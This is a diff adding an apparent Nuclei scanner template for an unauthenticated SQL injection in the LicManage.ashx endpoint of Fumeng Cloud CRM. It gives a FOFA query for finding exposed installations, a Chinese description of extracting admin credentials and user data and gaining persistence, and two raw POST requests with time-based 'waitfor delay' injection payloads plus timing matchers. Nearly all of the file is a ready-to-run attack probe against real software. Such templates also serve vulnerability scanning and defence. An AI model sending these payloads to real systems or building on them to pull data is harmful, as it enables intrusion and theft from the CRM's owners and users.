@@ -1,0 +1,29 @@
+id: fumeng-cloud-crm-licmanage-sqli
+info:
+  name: 孚盟云CRM LicManage.ashx接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="孚盟软件-孚盟云"
+          上海孚盟软件有限公司开发的孚盟云CRM系统中，LicManage.ashx处理组件存在SQL注入缺陷。未经身份验证的远程攻击者可通过构造恶意SQL查询语句，实现对后端数据库的敏感数据提取（包括但不限于管理员后台凭证、用户隐私数据）。在具备数据库写权限条件下，攻击者可能通过注入链实现服务器端任意文件写入，进而建立持久化控制通道。该漏洞可作为后续横向渗透的初始突破口。
+  tags: 孚盟云
+http:
+- raw:
+  - |
+    POST /Ajax/LicManage.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    action=ExtensionPermit&MouldID='waitfor+delay'0:0:5'--&BillFID=1
+  - |
+    POST /Ajax/LicManage.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    action=ExtensionPermit&MouldID='waitfor+delay'0:0:8'--&BillFID=1
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
